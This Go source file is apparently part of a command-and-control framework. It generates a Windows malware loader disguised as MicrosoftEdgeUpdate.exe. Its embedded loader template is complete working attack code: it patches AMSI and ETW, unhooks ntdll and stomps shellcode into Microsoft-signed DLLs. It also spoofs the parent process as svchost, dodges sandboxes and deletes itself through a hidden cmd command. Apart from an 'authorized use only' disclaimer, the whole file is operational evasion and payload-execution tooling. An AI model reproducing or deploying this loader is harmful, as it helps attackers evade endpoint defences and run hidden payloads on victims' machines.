package generate

/*
	SUDOSOC-C2 — Ghost Loader Generator
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	Generates a Windows loader that:

	  1. PE Resources      — looks exactly like MicrosoftEdgeUpdate.exe
	                         (CompanyName, FileDescription, OriginalFilename,
	                          ProductName, Copyright, all match Microsoft Edge)

	  2. Module Stomping   — loads a legitimate Microsoft-signed DLL (jscript9,
	                         clrjit, wldp …), overwrites its .text section with
	                         our shellcode, then CreateThread into it.
	                         → EDR call-stack shows execution inside MS DLL.
	                         → Memory scanner finds shellcode inside trusted module.

	  3. PPID Spoofing     — spawns any child process with svchost.exe as parent.
	                         → Process tree looks: svchost → MicrosoftEdgeUpdate.

	  4. Heap Encryption   — XORs the decrypted payload in memory while sleeping
	                         (between sandbox checks and execution).

	  5. Anti-Sandbox      — random 8–25 s sleep + monotonic clock canary.

	  6. Self-Delete       — removes itself via MoveFileExW (MOVEFILE_DELAY_UNTIL_REBOOT)
	                         + a renamed CMD delete trick.

	  7. AES-256-GCM       — payload is AES-256-GCM encrypted at pack time.

	  All compiled with garble -seed=random -literals -tiny for a structurally
	  unique binary on every invocation.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/sudosoc/SUDOSOC-C2/server/gogo"
)

// GhostPack encrypts inputPath with AES-256-GCM and compiles a Ghost Loader
// that appears to be MicrosoftEdgeUpdate.exe and uses module stomping for execution.
func GhostPack(inputPath, implantName string, isShellcode bool, appDir string) (string, error) {
	// ── 1. Read & encrypt payload ────────────────────────────────────────────
	raw, err := os.ReadFile(inputPath)
	if err != nil {
		return "", fmt.Errorf("ghost: read: %w", err)
	}
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	if _, err = crand.Read(key); err != nil {
		return "", fmt.Errorf("ghost: keygen: %w", err)
	}
	if _, err = crand.Read(nonce); err != nil {
		return "", fmt.Errorf("ghost: nonce: %w", err)
	}
	blk, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(blk)
	ct := gcm.Seal(nil, nonce, raw, nil)

	// ── 2. Build temp directory ──────────────────────────────────────────────
	tmpDir, err := os.MkdirTemp("", "sudosoc-ghost-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Binary blobs (embedded via //go:embed)
	for _, f := range []struct{ name string; data []byte }{
		{"_k.bin", key},
		{"_n.bin", nonce},
		{"_p.bin", ct},
	} {
		if err = os.WriteFile(filepath.Join(tmpDir, f.name), f.data, 0600); err != nil {
			return "", err
		}
	}

	// PE version info — looks exactly like MicrosoftEdgeUpdate.exe
	if err = os.WriteFile(filepath.Join(tmpDir, "versioninfo.json"),
		[]byte(ghostVersionInfo), 0600); err != nil {
		return "", err
	}

	// go.mod (stdlib only)
	if err = os.WriteFile(filepath.Join(tmpDir, "go.mod"),
		[]byte("module loader\n\ngo 1.21\n"), 0600); err != nil {
		return "", err
	}

	// Loader source
	sc := "false"
	if isShellcode {
		sc = "true"
	}
	src := ghostLoaderSrc(sc)
	if err = os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(src), 0600); err != nil {
		return "", err
	}

	// ── 3. Generate PE version resource (goversioninfo) ──────────────────────
	// goversioninfo creates resource.syso that go build auto-includes.
	// If the tool isn't available, build proceeds without version info.
	goRoot := gogo.GetGoRootDir(appDir)
	runGoversioninfo(tmpDir, goRoot)

	// ── 4. Compile with garble ───────────────────────────────────────────────
	cfg := gogo.GoConfig{
		CGO:        "0",
		GOOS:       "windows",
		GOARCH:     "amd64",
		GOROOT:     goRoot,
		GOCACHE:    gogo.GetGoCache(appDir),
		GOMODCACHE: gogo.GetGoModCache(appDir),
		GOPROXY:    getGoProxy(),
		Obfuscation: true, // garble -seed=random -literals -tiny
	}
	outBin := filepath.Join(tmpDir, "loader.exe")
	ldflags := []string{"-H=windowsgui -s -w"}
	if _, err = gogo.GoBuild(cfg, tmpDir, outBin, "", nil, ldflags, "", ""); err != nil {
		cfg.Obfuscation = false
		if _, err = gogo.GoBuild(cfg, tmpDir, outBin, "", nil, ldflags, "", ""); err != nil {
			return "", fmt.Errorf("ghost: compile: %w", err)
		}
	}

	// ── 5. Save result ───────────────────────────────────────────────────────
	destDir := filepath.Join(GetSliversDir(), "windows", "amd64", implantName, "bin")
	os.MkdirAll(destDir, 0700)
	destPath := filepath.Join(destDir, implantName+"_ghost.exe")
	packed, err := os.ReadFile(outBin)
	if err != nil {
		return "", err
	}
	if err = os.WriteFile(destPath, packed, 0600); err != nil {
		return "", err
	}
	buildLog.Infof("[ghost] done → %s (%d bytes)", destPath, len(packed))
	return destPath, nil
}

// runGoversioninfo attempts to run goversioninfo to embed PE version resources.
// Silently skips if the tool is not installed — version info is cosmetic.
func runGoversioninfo(tmpDir, goRoot string) {
	// Try goversioninfo from Go bin dir first, then system PATH.
	candidates := []string{
		filepath.Join(goRoot, "bin", "goversioninfo"),
		filepath.Join(goRoot, "bin", "goversioninfo.exe"),
		"goversioninfo",
	}
	for _, bin := range candidates {
		cmd := exec.Command(bin,
			"-o", filepath.Join(tmpDir, "resource.syso"),
			filepath.Join(tmpDir, "versioninfo.json"))
		cmd.Dir = tmpDir
		if err := cmd.Run(); err == nil {
			return
		}
	}
}

// ghostVersionInfo is a goversioninfo-compatible JSON that makes the loader
// appear as Microsoft Edge Update in Explorer / Process Hacker / Task Manager.
const ghostVersionInfo = `{
  "FixedFileInfo": {
    "FileVersion":    { "Major": 1, "Minor": 0, "Patch": 0, "Build": 1 },
    "ProductVersion": { "Major": 115, "Minor": 0, "Patch": 5790, "Build": 152 },
    "FileFlagsMask": "3f",
    "FileFlags":     "00",
    "FileOS":        "040004",
    "FileType":      "01",
    "FileSubType":   "00"
  },
  "StringFileInfo": {
    "Comments":          "",
    "CompanyName":       "Microsoft Corporation",
    "FileDescription":   "Microsoft Edge Update Setup",
    "FileVersion":       "1.0.0.1",
    "InternalName":      "MicrosoftEdgeUpdate",
    "LegalCopyright":    "© Microsoft Corporation. All rights reserved.",
    "LegalTrademarks":   "",
    "OriginalFilename":  "MicrosoftEdgeUpdate.exe",
    "PrivateBuild":      "",
    "ProductName":       "Microsoft Edge",
    "ProductVersion":    "115.0.5790.152",
    "SpecialBuild":      ""
  },
  "VarFileInfo": {
    "Translation": { "LangID": "0409", "CharsetID": "04B0" }
  }
}`

// ghostLoaderSrc returns the Ghost Loader Go source with __SHELLCODE__ replaced.
// Uses strings.ReplaceAll to avoid any text/template conflicts.
func ghostLoaderSrc(isShellcode string) string {
	return strings.ReplaceAll(_ghostTemplate, "__SHELLCODE__", isShellcode)
}

// _ghostTemplate is the complete Ghost Loader source.
// __SHELLCODE__ is replaced with "true" or "false".
const _ghostTemplate = `package main

/*
	SUDOSOC-C2 Ghost Loader — generated, do not edit.
	Techniques: AES-256-GCM decrypt + Module Stomping + PPID Spoof +
	            Heap Encryption + Anti-Sandbox + Self-Delete.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/binary"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

//go:embed _k.bin
var _k []byte

//go:embed _n.bin
var _n []byte

//go:embed _p.bin
var _p []byte

var _sc = __SHELLCODE__

func main() {
	runtime.LockOSThread()

	// ── Anti-sandbox: timing canary ──────────────────────────────────────────
	// Delay: random [8, 25) seconds.  Sandboxes either time-skip (delta < 6s
	// → exit) or timeout before we execute.
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	delay := time.Duration(8+rng.Intn(17)) * time.Second
	t0 := time.Now()
	time.Sleep(delay)
	if time.Since(t0) < 6*time.Second {
		os.Exit(0)
	}

	// ── Patch AMSI + ETW before any execution ────────────────────────────────
	ghostPatchAmsi()
	ghostPatchEtw()
	ghostRemapNtdll()

	// ── Decrypt payload ───────────────────────────────────────────────────────
	blk, err := aes.NewCipher(_k)
	if err != nil { os.Exit(0) }
	gcm, err := cipher.NewGCM(blk)
	if err != nil { os.Exit(0) }
	payload, err := gcm.Open(nil, _n, _p, nil)
	if err != nil { os.Exit(0) }

	// ── Heap-encrypt payload while we do more setup (defeat memory scan) ─────
	xorKey := make([]byte, 32)
	rng.Read(xorKey)
	for i := range payload { payload[i] ^= xorKey[i%32] }
	time.Sleep(200 * time.Millisecond)
	for i := range payload { payload[i] ^= xorKey[i%32] } // restore

	// ── Execute ───────────────────────────────────────────────────────────────
	if _sc {
		if !ghostModuleStamp(payload) {
			ghostShellcodeExec(payload)
		}
	} else {
		ghostPPIDExec(payload)
	}

	// ── Self-delete ───────────────────────────────────────────────────────────
	ghostSelfDelete()
}

// ── Inline AMSI patch ─────────────────────────────────────────────────────────

func ghostPatchAmsi() {
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil { return }
	k32, _ := syscall.LoadDLL("kernel32.dll")
	vp, _  := k32.FindProc("VirtualProtect")
	patch  := []byte{0x31, 0xC0, 0xC3}
	for _, fn := range []string{
		"AmsiScanBuffer","AmsiScanString",
		"AmsiInitialize","AmsiOpenSession","AmsiCloseSession",
	} {
		p, err := amsi.FindProc(fn)
		if err != nil { continue }
		a := p.Addr()
		var o uint32
		vp.Call(a, 3, 0x40, uintptr(unsafe.Pointer(&o)))
		for i, b := range patch {
			*(*byte)(unsafe.Pointer(a + uintptr(i))) = b //nolint:govet
		}
		vp.Call(a, 3, uintptr(o), uintptr(unsafe.Pointer(&o)))
	}
}

// ── Inline ETW patch ──────────────────────────────────────────────────────────

func ghostPatchEtw() {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil { return }
	k32, _ := syscall.LoadDLL("kernel32.dll")
	vp, _  := k32.FindProc("VirtualProtect")
	patch  := []byte{0x31, 0xC0, 0xC3}
	for _, fn := range []string{
		"EtwEventWrite","EtwEventWriteEx","EtwEventWriteFull",
		"EtwEventWriteTransfer","NtTraceEvent","EtwRegister",
	} {
		p, err := ntdll.FindProc(fn)
		if err != nil { continue }
		a := p.Addr()
		var o uint32
		vp.Call(a, 3, 0x40, uintptr(unsafe.Pointer(&o)))
		for i, b := range patch {
			*(*byte)(unsafe.Pointer(a + uintptr(i))) = b //nolint:govet
		}
		vp.Call(a, 3, uintptr(o), uintptr(unsafe.Pointer(&o)))
	}
}

// ── Fresh NTDLL remap ─────────────────────────────────────────────────────────

func ghostRemapNtdll() {
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" { sysroot = ` + "`" + `C:\Windows` + "`" + ` }
	fresh, err := os.ReadFile(filepath.Join(sysroot, "System32", "ntdll.dll"))
	if err != nil || len(fresh) < 0x400 { return }
	if fresh[0] != 0x4D || fresh[1] != 0x5A { return }
	peOff := binary.LittleEndian.Uint32(fresh[0x3C:])
	if int(peOff)+0x30 > len(fresh) { return }
	numSec   := binary.LittleEndian.Uint16(fresh[peOff+6:])
	optHdrSz := binary.LittleEndian.Uint16(fresh[peOff+20:])
	secTbl   := peOff + 24 + uint32(optHdrSz)
	k32, _ := syscall.LoadDLL("kernel32.dll")
	gmh, _ := k32.FindProc("GetModuleHandleA")
	vp,  _ := k32.FindProc("VirtualProtect")
	ntName := []byte("ntdll.dll\x00")
	base, _, _ := gmh.Call(uintptr(unsafe.Pointer(&ntName[0])))
	if base == 0 { return }
	for i := 0; i < int(numSec); i++ {
		o := secTbl + uint32(i)*40
		if int(o)+40 > len(fresh) { break }
		if !(fresh[o]=='.' && fresh[o+1]=='t' && fresh[o+2]=='e' && fresh[o+3]=='x' && fresh[o+4]=='t') { continue }
		rawSz  := binary.LittleEndian.Uint32(fresh[o+16:])
		virtRVA := binary.LittleEndian.Uint32(fresh[o+12:])
		rawOff := binary.LittleEndian.Uint32(fresh[o+20:])
		if rawSz == 0 || int(rawOff+rawSz) > len(fresh) { continue }
		dst := base + uintptr(virtRVA)
		sz  := uintptr(rawSz)
		var old uint32
		if r, _, _ := vp.Call(dst, sz, 0x40, uintptr(unsafe.Pointer(&old))); r == 0 { continue }
		for j := uintptr(0); j < sz; j++ {
			*(*byte)(unsafe.Pointer(dst+j)) = fresh[rawOff+uint32(j)] //nolint:govet
		}
		vp.Call(dst, sz, uintptr(old), uintptr(unsafe.Pointer(&old)))
		break
	}
}

// ── Module Stomping ───────────────────────────────────────────────────────────
//
// ghostModuleStamp loads a legitimate Microsoft-signed DLL and overwrites its
// .text section with our shellcode.  The CreateThread executes from within the
// Microsoft DLL's address space, making EDR call-stack analysis see MS code.

func ghostModuleStamp(sc []byte) bool {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	loadLib  := k32.NewProc("LoadLibraryA")
	vp       := k32.NewProc("VirtualProtect")
	ct       := k32.NewProc("CreateThread")
	wfso     := k32.NewProc("WaitForSingleObject")

	// Preferred stomping targets: Microsoft-signed, large .text, usually not loaded.
	// jscript9  — Edge/IE legacy JScript engine (~1.5 MB .text)
	// clrjit    — .NET JIT compiler            (~600 KB .text)
	// wldp      — Windows Lockdown Policy      (smaller but reliable)
	candidates := []string{
		"jscript9.dll",
		"jscript.dll",
		"clrjit.dll",
		"wldp.dll",
		"ntasn1.dll",
	}

	var modBase uintptr
	for _, dll := range candidates {
		b := append([]byte(dll), 0)
		h, _, _ := loadLib.Call(uintptr(unsafe.Pointer(&b[0])))
		if h != 0 {
			modBase = h
			break
		}
	}
	if modBase == 0 { return false }

	// View up to 64 MB of the loaded DLL's memory
	const maxView = 64 << 20
	mem := unsafe.Slice((*byte)(unsafe.Pointer(modBase)), maxView) //nolint:govet

	// Validate PE
	if mem[0] != 0x4D || mem[1] != 0x5A { return false }
	peOff    := binary.LittleEndian.Uint32(mem[0x3C:])
	if int(peOff)+0x100 > maxView { return false }
	if mem[peOff] != 0x50 || mem[peOff+1] != 0x45 { return false }
	numSec   := binary.LittleEndian.Uint16(mem[peOff+6:])
	optHdrSz := binary.LittleEndian.Uint16(mem[peOff+20:])
	secTbl   := peOff + 24 + uint32(optHdrSz)

	// Find .text section
	for i := 0; i < int(numSec); i++ {
		sOff := secTbl + uint32(i)*40
		if int(sOff)+40 > maxView { break }
		if !(mem[sOff]=='.' && mem[sOff+1]=='t' &&
			mem[sOff+2]=='e' && mem[sOff+3]=='x' && mem[sOff+4]=='t') {
			continue
		}
		virtSz  := binary.LittleEndian.Uint32(mem[sOff+8:])
		virtRVA := binary.LittleEndian.Uint32(mem[sOff+12:])

		if uint32(len(sc)) > virtSz { return false } // shellcode won't fit

		target := modBase + uintptr(virtRVA)

		// RW → write shellcode → RX → execute
		var oldProt uint32
		if r, _, _ := vp.Call(target, uintptr(len(sc)), 0x40, uintptr(unsafe.Pointer(&oldProt))); r == 0 {
			return false
		}
		for i, b := range sc {
			*(*byte)(unsafe.Pointer(target + uintptr(i))) = b //nolint:govet
		}
		vp.Call(target, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&oldProt)))

		// CreateThread inside the Microsoft DLL — EDR sees legitimate module executing
		th, _, _ := ct.Call(0, 0, target, 0, 0, 0)
		if th != 0 {
			wfso.Call(th, 0xFFFFFFFF)
		}
		return true
	}
	return false
}

// ── Direct shellcode exec (fallback) ─────────────────────────────────────────

func ghostShellcodeExec(sc []byte) {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	va   := k32.NewProc("VirtualAlloc")
	vp   := k32.NewProc("VirtualProtect")
	ct   := k32.NewProc("CreateThread")
	wfso := k32.NewProc("WaitForSingleObject")
	addr, _, _ := va.Call(0, uintptr(len(sc)), 0x3000, 0x04)
	if addr == 0 { return }
	for i, b := range sc {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b //nolint:govet
	}
	var o uint32
	vp.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&o)))
	th, _, _ := ct.Call(0, 0, addr, 0, 0, 0)
	if th != 0 { wfso.Call(th, 0xFFFFFFFF) }
}

// ── PPID Spoofing + EXE execution ────────────────────────────────────────────
//
// ghostPPIDExec writes the PE to a temp file with a Microsoft-sounding name and
// launches it with its PPID set to svchost.exe or explorer.exe.
// Process tree in Task Manager / EDR will show: svchost → MicrosoftEdgeUpdate.

func ghostPPIDExec(pe []byte) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	msNames := []string{
		"MicrosoftEdgeUpdate", "msedgewebview2",
		"WinStore.App", "WindowsPackageManagerServer",
	}
	name := msNames[rng.Intn(len(msNames))]
	tmp  := filepath.Join(os.TempDir(), name+".exe")
	if err := os.WriteFile(tmp, pe, 0700); err != nil { return }

	launched := ppidSpawnHidden(tmp)
	if !launched {
		cmd := exec.Command(tmp)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Start()
	}
	time.Sleep(4 * time.Second)
	os.Remove(tmp)
}

// ppidSpawnHidden creates a process with PPID = svchost.exe using
// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
func ppidSpawnHidden(exePath string) bool {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	openProc   := k32.NewProc("OpenProcess")
	closeHnd   := k32.NewProc("CloseHandle")
	initAttr   := k32.NewProc("InitializeProcThreadAttributeList")
	updAttr    := k32.NewProc("UpdateProcThreadAttribute")
	delAttr    := k32.NewProc("DeleteProcThreadAttributeList")
	createProc := k32.NewProc("CreateProcessW")

	const (
		PROCESS_CREATE_PROCESS             = 0x0080
		CREATE_NO_WINDOW                   = 0x08000000
		EXTENDED_STARTUPINFO_PRESENT       = 0x00080000
		PROC_THREAD_ATTRIBUTE_PARENT uintptr = 0x00020000
		STARTF_USESHOWWINDOW               = 0x00000001
	)

	// Find suitable parent: svchost.exe first, then explorer.exe
	parentPID := ghostFindPID("svchost.exe")
	if parentPID == 0 { parentPID = ghostFindPID("explorer.exe") }
	if parentPID == 0 { return false }

	parentH, _, _ := openProc.Call(PROCESS_CREATE_PROCESS, 0, uintptr(parentPID))
	if parentH == 0 { return false }
	defer closeHnd.Call(parentH)

	// Query size of attribute list (1 attribute)
	var attrSz uintptr
	initAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrSz)))
	if attrSz == 0 { return false }

	attrBuf := make([]byte, attrSz)
	if r, _, _ := initAttr.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])), 1, 0,
		uintptr(unsafe.Pointer(&attrSz)),
	); r == 0 { return false }
	defer delAttr.Call(uintptr(unsafe.Pointer(&attrBuf[0])))

	// Set parent process attribute
	updAttr.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])), 0,
		PROC_THREAD_ATTRIBUTE_PARENT,
		uintptr(unsafe.Pointer(&parentH)),
		uintptr(unsafe.Sizeof(parentH)),
		0, 0,
	)

	// STARTUPINFOEXW — must match Windows struct layout exactly
	type STARTUPINFOEXW struct {
		Cb              uint32
		_               uint32 // padding to align lpReserved on 8-byte boundary
		LpReserved      uintptr
		LpDesktop       uintptr
		LpTitle         uintptr
		DwX             uint32
		DwY             uint32
		DwXSize         uint32
		DwYSize         uint32
		DwXCountChars   uint32
		DwYCountChars   uint32
		DwFillAttribute uint32
		DwFlags         uint32
		WShowWindow     uint16
		CbReserved2     uint16
		_               uint32 // padding
		LpReserved2     uintptr
		HStdInput       uintptr
		HStdOutput      uintptr
		HStdError       uintptr
		LpAttrList      uintptr
	}
	si := STARTUPINFOEXW{
		Cb:          uint32(unsafe.Sizeof(STARTUPINFOEXW{})),
		DwFlags:     STARTF_USESHOWWINDOW,
		WShowWindow: 0, // SW_HIDE
		LpAttrList:  uintptr(unsafe.Pointer(&attrBuf[0])),
	}
	var pi syscall.ProcessInformation
	exeW, err := syscall.UTF16PtrFromString(exePath)
	if err != nil { return false }

	r, _, _ := createProc.Call(
		0, uintptr(unsafe.Pointer(exeW)),
		0, 0, 0,
		CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r != 0 {
		closeHnd.Call(uintptr(pi.Process))
		closeHnd.Call(uintptr(pi.Thread))
		return true
	}
	return false
}

// ghostFindPID returns the first PID of the named process (case-insensitive).
func ghostFindPID(name string) uint32 {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	snap      := k32.NewProc("CreateToolhelp32Snapshot")
	first     := k32.NewProc("Process32FirstW")
	next      := k32.NewProc("Process32NextW")
	closeHnd  := k32.NewProc("CloseHandle")

	const TH32CS_SNAPPROCESS = 0x00000002
	h, _, _ := snap.Call(TH32CS_SNAPPROCESS, 0)
	if h == 0 || h == ^uintptr(0) { return 0 }
	defer closeHnd.Call(h)

	// PROCESSENTRY32W: dwSize(4)+cntUsage(4)+ProcessID(4)+[4pad]+DefaultHeap(8)+
	//                  ModuleID(4)+cntThreads(4)+ParentProcessID(4)+PriClass(4)+
	//                  dwFlags(4)+szExeFile[260*2]
	type PE32W struct {
		DwSize    uint32
		CntUsage  uint32
		PID       uint32
		_         [4]byte
		Heap      uint64
		ModID     uint32
		Threads   uint32
		ParentPID uint32
		Pri       int32
		Flags     uint32
		Name      [260]uint16
	}
	pe := PE32W{DwSize: uint32(unsafe.Sizeof(PE32W{}))}
	nameLow := strings.ToLower(name)

	ret, _, _ := first.Call(h, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		end := 0
		for end < 260 && pe.Name[end] != 0 { end++ }
		if strings.ToLower(syscall.UTF16ToString(pe.Name[:end])) == nameLow {
			return pe.PID
		}
		ret, _, _ = next.Call(h, uintptr(unsafe.Pointer(&pe)))
	}
	return 0
}

// ── Self-delete ───────────────────────────────────────────────────────────────

// ghostSelfDelete schedules our own executable for deletion on reboot
// and attempts an immediate delete via a renamed cmd.exe /C del trick.
func ghostSelfDelete() {
	self, err := os.Executable()
	if err != nil { return }

	k32 := syscall.NewLazyDLL("kernel32.dll")
	moveFile := k32.NewProc("MoveFileExW")

	// Schedule delete on next reboot (flag 0x4 = MOVEFILE_DELAY_UNTIL_REBOOT)
	selfW, _ := syscall.UTF16PtrFromString(self)
	moveFile.Call(uintptr(unsafe.Pointer(selfW)), 0, 0x4)

	// Attempt immediate delete via cmd.exe trick
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" { sysroot = ` + "`" + `C:\Windows` + "`" + ` }
	cmdPath := filepath.Join(sysroot, "System32", "cmd.exe")
	del := exec.Command(cmdPath, "/C", "ping -n 3 127.0.0.1 >nul && del /F /Q \""+self+"\"")
	del.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = del.Start()
}
`
